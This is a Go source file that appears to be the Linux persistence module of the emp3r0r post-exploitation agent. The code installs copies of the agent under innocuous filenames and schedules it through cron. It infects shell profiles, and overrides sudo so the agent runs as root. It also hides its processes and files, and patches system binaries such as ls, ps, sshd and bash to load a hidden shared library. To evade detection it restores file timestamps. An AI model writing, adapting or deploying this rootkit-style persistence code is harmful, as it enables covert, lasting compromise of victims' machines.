//go:build linux
// +build linux

package modules

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var (
	// PersistMethods CC calls one of these methods to get persistence, or all of them at once
	// look at emp3r0r_def.PersistMethods too
	PersistMethods = map[string]func() error{
		"profiles": profiles,
		"cron":     cronJob,
		"patcher":  patcher,
	}

	// Hidden_PIDs list of hidden files/pids
	// see loader.c
	Hidden_PIDs  = "/usr/share/at/batch-job.at"
	Hidden_Files = "/usr/share/at/daily-job.at"

	// Patched_List list of patched sys utils
	Patched_List = []string{
		"/usr/bin/ls",
		"/usr/bin/dir",
		"/usr/bin/ps",
		"/usr/bin/pstree",
		"/usr/bin/netstat",
		"/usr/sbin/sshd",
		"/usr/bin/bash",
		"/usr/bin/sh",
		"/usr/bin/ss",
	}
)

// Configure install locations
func getInstallLocations() (locations []string) {
	for _, loc := range common.WritableLocations {
		fname := def.CommonFilenames[util.RandInt(0, len(def.CommonFilenames))]
		locations = append(locations, loc+"/"+fname)
	}
	return
}

// installToAllLocations copy agent to multiple locations
func installToAllLocations() []string {
	locations := getInstallLocations()
	for _, path := range locations {
		err := CopySelfTo(path)
		if err != nil {
			logging.Print(err)
			continue
		}
	}

	return locations
}

// installToRandomLocation copy agent to a random location
func installToRandomLocation() (target string, err error) {
	locations := getInstallLocations()
	target = locations[util.RandInt(0, len(locations))]
	err = CopySelfTo(target)
	return
}

// PersistAllInOne run all persistence method at once
func PersistAllInOne() (final_err error) {
	for k, method := range PersistMethods {
		res := "succeeded"
		method_err := method()
		if method_err != nil {
			res = fmt.Sprintf("failed: %v", method_err)
		}
		e := fmt.Errorf("%s: %s", k, res)
		if e != nil {
			final_err = fmt.Errorf("%v; %v", final_err, e)
		}
	}
	return
}

func cronJob() (err error) {
	exe_location, err := installToRandomLocation()
	if err != nil {
		return err
	}
	return AddCronJob("*/5 * * * * PERSISTENCE=true " + exe_location)
}

func profiles() (err error) {
	exe, err := installToRandomLocation()
	if err != nil {
		return err
	}
	user, err := user.Current()
	if err != nil {
		return fmt.Errorf("cannot get user profile: %v", err)
	}
	accountInfo, err := sysinfo.CheckAccount(user.Name)
	if err != nil {
		return fmt.Errorf("cannot check account info: %v", err)
	}

	// source
	bashprofile := fmt.Sprintf("%s/.bash_profile", user.HomeDir)
	sourceCmd := "source ~/.bash_profile"
	if sysinfo.HasRoot() {
		bashprofile = "/etc/bash_profile"
		sourceCmd = "source /etc/bash_profile"
	}

	// call this to start emp3r0r
	payload := exe

	// set +m to silent job control
	payload = "set +m;" + payload

	// nologin users cannot do shit here
	if strings.Contains(accountInfo["shell"], "nologin") ||
		strings.Contains(accountInfo["shell"], "false") {
		if user.Uid != "0" {
			return errors.New("this user cannot login")
		}
	}

	// loader
	loader := fmt.Sprintf("export PERSISTENCE=true\n%s 2>/dev/null", payload)

	// exec our payload as root too!
	// sudo payload
	var sudoLocs []string
	all_locations := installToAllLocations()
	for _, loc := range all_locations {
		sudoLocs = append(sudoLocs, "/usr/bin/sudo -E "+loc)
	}
	sudoPayload := strings.Join(sudoLocs, "||")
	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;((%s) 2>/dev/null)) }", sudoPayload)
	err = util.WriteFileAgent(bashprofile, []byte(loader), 0o644)
	if err != nil {
		return
	}

	// check if profiles are already written
	data, err := os.ReadFile(user.HomeDir + "/.bashrc")
	if err != nil {
		logging.Println(err)
		return
	}
	if strings.Contains(string(data), sourceCmd) {
		err = errors.New("already written")
		return
	}
	// infect all profiles
	_ = util.AppendTextToFileAgent(user.HomeDir+"/.profile", sourceCmd)
	_ = util.AppendTextToFileAgent(user.HomeDir+"/.bashrc", sourceCmd)
	_ = util.AppendTextToFileAgent(user.HomeDir+"/.zshrc", sourceCmd)
	_ = util.AppendTextToFileAgent("/etc/profile", "source "+bashprofile)

	return
}

// AddCronJob add a cron job without terminal
// this creates a cron job for whoever runs the function
func AddCronJob(job string) error {
	cmdStr := fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", job)
	cmd := exec.Command("/bin/sh", "-c", cmdStr)
	return cmd.Start()
}

func HidePIDs() (err error) {
	// mkdir
	if !util.IsDirExist("/usr/share/at") {
		os.MkdirAll("/usr/share/at", 0o755)
	}
	pids := make([]int, 0)

	// read PID list
	// add PIDs that are still running
	data, err := os.ReadFile(Hidden_PIDs)
	if err == nil {
		pid_list := strings.Split(string(data), "\n")
		for _, pid_str := range pid_list {
			if pid_str != "" {
				pid, err := strconv.ParseInt(pid_str, 10, 32)
				if err != nil {
					continue
				}
				// check if PID is alive
				if util.IsPIDAlive(int(pid)) {
					logging.Printf("PID %d is alive, keep hidden", pid)
					pids = append(pids, int(pid))
				}
			}
		}
	}

	// hide this process and all children
	my_pid := os.Getpid()
	children, err := util.GetChildren(my_pid)
	if err != nil {
		return
	}
	pids = append(pids, my_pid)
	pids = append(pids, children...)

	// parse PIDs
	pids = util.RemoveDupsFromArray(pids)
	pid_list_str := strings.Join(util.IntArrayToStringArray(pids), "\n")

	err = util.WriteFileAgent(Hidden_PIDs, []byte(pid_list_str), 0o644)
	if err != nil {
		return
	}
	logging.Printf("Added PIDs to %s:\n%s", Hidden_PIDs, pid_list_str)
	return
}

// patch ELF file so it automatically loads and runs loader.so
func patcher() (err error) {
	if !sysinfo.HasRoot() {
		return errors.New("root required")
	}

	// PIDs
	err = HidePIDs()
	if err != nil {
		logging.Printf("Cannot hide PIDs: %v", err)
	}

	// files
	files := fmt.Sprintf("%s\n%s\n%s",
		util.FileBaseName(common.RuntimeConfig.AgentRoot),
		util.FileBaseName(Hidden_Files),
		util.FileBaseName(Hidden_PIDs))
	err = util.WriteFileAgent(Hidden_Files, []byte(files), 0o644)
	if err != nil {
		logging.Printf("Cannot create %s: %v", Hidden_Files, err)
	}
	var err_list []error

	// patch system utilities
	for _, file := range Patched_List {
		bak := fmt.Sprintf("%s/%s.bak", common.RuntimeConfig.AgentRoot, file)
		if !util.IsFileExist(file) || util.IsFileExist(bak) {
			continue
		}

		so_path, err := prepare_loader_so(os.Getpid(), file)
		if err != nil {
			return err
		}
		addLibErr := exeutil.AddDTNeeded(file, so_path)
		if addLibErr != nil {
			err_list = append(err_list, addLibErr)
		}

		// Restore the original file timestamps
		// ctime is not changed
		err = agentutils.RestoreFileTimes(file)
		if err != nil {
			return err
		}
	}
	if len(err_list) > 0 {
		return fmt.Errorf("patcher: %v", err_list)
	}
	return
}

// ElfPatcher patches an ELF file to load a specific SO file on startup
// This function allows users to patch arbitrary ELF files with custom SO libraries
// targetPath is optional - if empty, uses random path and filename
func ElfPatcher(elfPath, soPath, targetPath string) error {
	// Validate input paths
	if !util.IsFileExist(elfPath) {
		return fmt.Errorf("ELF file %s does not exist", elfPath)
	}

	if !util.IsFileExist(soPath) {
		return fmt.Errorf("SO file %s does not exist", soPath)
	}

	// Create backup of original ELF file
	backupPath := elfPath + ".backup"
	if !util.IsFileExist(backupPath) {
		err := util.CopyAgent(elfPath, backupPath)
		if err != nil {
			return fmt.Errorf("failed to create backup of %s: %v", elfPath, err)
		}
		logging.Printf("Created backup: %s", backupPath)
	}

	var finalSOPath string
	var err error

	if targetPath != "" {
		// User specified target path - use it directly
		finalSOPath = targetPath

		// Ensure the directory exists
		targetDir := filepath.Dir(finalSOPath)
		err = os.MkdirAll(targetDir, 0755)
		if err != nil {
			return fmt.Errorf("failed to create directory %s: %v", targetDir, err)
		}

		logging.Printf("Using user-specified target path: %s", finalSOPath)
	} else {
		// Generate a random storage location for the SO file
		randomDir, err := common.GetRandomWritablePath()
		if err != nil {
			return fmt.Errorf("failed to get random writable path: %v", err)
		}

		// Ensure the directory exists
		err = os.MkdirAll(randomDir, 0755)
		if err != nil {
			return fmt.Errorf("failed to create directory %s: %v", randomDir, err)
		}

		// Generate random SO filename to avoid detection
		randomSOName := common.NameTheLibrary()
		if randomSOName == "" {
			randomSOName = fmt.Sprintf("lib%s.so.%d", util.RandStr(8), util.RandInt(1, 99))
		}

		finalSOPath = fmt.Sprintf("%s/%s", randomDir, randomSOName)
		logging.Printf("Using random target path: %s", finalSOPath)
	}

	// Copy SO file to random location
	err = util.CopyAgent(soPath, finalSOPath)
	if err != nil {
		return fmt.Errorf("failed to copy SO file to %s: %v", finalSOPath, err)
	}

	logging.Printf("Copied SO file to: %s", finalSOPath)

	// Copy timestamps from ELF file to SO file to make them appear contemporaneous
	err = agentutils.CopyFileTimes(elfPath, finalSOPath)
	if err != nil {
		logging.Printf("Warning: failed to copy file times from %s to %s: %v", elfPath, finalSOPath, err)
	}

	// Patch the ELF file to load our SO
	err = exeutil.AddDTNeeded(elfPath, finalSOPath)
	if err != nil {
		// Restore backup on failure
		util.CopyAgent(backupPath, elfPath)
		return fmt.Errorf("failed to patch ELF file %s: %v", elfPath, err)
	}

	// Restore original file timestamps to avoid detection
	err = agentutils.RestoreFileTimes(elfPath)
	if err != nil {
		logging.Printf("Warning: failed to restore file times for %s: %v", elfPath, err)
	}

	logging.Printf("Successfully patched %s to load %s", elfPath, finalSOPath)
	return nil
}
